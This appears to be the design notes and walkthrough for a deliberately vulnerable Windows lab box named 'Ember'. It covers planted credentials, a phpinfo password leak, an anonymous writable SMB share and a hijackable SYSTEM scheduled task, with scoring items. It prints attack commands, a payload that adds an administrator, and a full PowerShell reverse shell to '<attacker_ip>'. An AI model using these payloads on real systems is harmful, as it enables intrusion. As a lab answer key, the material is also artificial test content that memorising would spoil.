# Ember

> Forgotten windows server that should have been retired many years ago.

---

## Overview

| Property | Value |
|----------|-------|
| Difficulty | Easy |
| OS | Windows Server |
| Services | HTTP (IIS + PHP), SMB, RDP |
| Initial Access | phpinfo Password Leak, Anonymous SMB Share |
| Privilege Escalation | Writable Scheduled Task Script |

---

## Users

| Username | Password | Notes |
|----------|----------|-------|
| ember | J4f9juEr | RDP access, legacy admin |
| ops | 9ksP311p | RDP access |
| Administrator | RM1dT8zj | |

---

## Services

### IIS + PHP Website (:80)
- Basic legacy infrastructure page
- `/info.php` exposes PHP configuration including environment variables
- Web root: `C:\inetpub\wwwroot`

### SMB Share (:445)
- Share name: `Scripts`
- Path: `C:\Scripts`
- Permissions: Anonymous full access (Everyone + Anonymous Logon)
- Contains maintenance scripts including one executed by scheduled task

### RDP (:3389)
- Enabled for ember and ops users

---

## Attack Vectors

### Initial Access

#### Option 1: phpinfo Password Leak

The `/info.php` page displays PHP configuration including system environment variables. The `SECRET` environment variable contains the ember user password.

1. Browse to the website:
   ```
   http://<target_ip>/info.php
   ```

2. Search for environment variables section and find:
   ```
   SECRET = J4f9juEr
   ```

3. Connect via RDP as ember:
   ```bash
   xfreerdp /u:ember /p:J4f9juEr /v:<target_ip>
   ```

#### Option 2: Anonymous SMB Share

The Scripts share allows anonymous access and contains writable PowerShell scripts.

1. List SMB shares anonymously:
   ```bash
   smbclient -L //<target_ip>/ -N
   ```

2. Connect to Scripts share:
   ```bash
   smbclient //<target_ip>/Scripts -N
   ```

3. List contents:
   ```
   smb: \> ls
   maintenance.ps1
   backup.ps1
   cleanup.ps1
   healthcheck.ps1
   README.txt
   ```

4. The `maintenance.ps1` script is executed by a scheduled task running as SYSTEM.

### Privilege Escalation

#### Writable Scheduled Task Script

A scheduled task named `SystemMaintenance` runs `C:\Scripts\maintenance.ps1` as SYSTEM every 5 minutes. The script is writable via the anonymous SMB share.

1. View the scheduled task:
   ```powershell
   schtasks /query /tn "SystemMaintenance" /v
   ```

2. Create a malicious script (add new admin user):
   ```powershell
   # payload.ps1
   net user hacker Password123! /add
   net localgroup Administrators hacker /add
   ```

3. Replace maintenance.ps1 via SMB:
   ```bash
   smbclient //<target_ip>/Scripts -N
   smb: \> put payload.ps1 maintenance.ps1
   ```

4. Wait up to 5 minutes for the scheduled task to execute

5. Connect as the new admin:
   ```bash
   xfreerdp /u:hacker /p:Password123! /v:<target_ip>
   ```

**Alternative payload (reverse shell):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

---

## Scoring

### Services
- [ ] Website (IIS + PHP on :80)
- [ ] SMB (Scripts share)

### Control Files
- [ ] `C:\Users\ember\ctrl.txt`
- [ ] `C:\Users\Administrator\ctrl.txt`

---

## File Locations

| Purpose | Path |
|---------|------|
| Web Root | C:\inetpub\wwwroot |
| PHP Info Page | C:\inetpub\wwwroot\info.php |
| PHP Installation | C:\PHP |
| Scripts Share | C:\Scripts |
| Maintenance Script (Vuln) | C:\Scripts\maintenance.ps1 |
| Scheduled Task | SystemMaintenance |

---

## SMB Share Contents

| File | Description | Scheduled |
|------|-------------|-----------|
| maintenance.ps1 | System maintenance (VULNERABLE) | Every 5 minutes as SYSTEM |
| backup.ps1 | Weekly backup script | Not active |
| cleanup.ps1 | Monthly log cleanup | Not active |
| healthcheck.ps1 | Manual health check | Not scheduled |
| README.txt | Script descriptions | N/A |
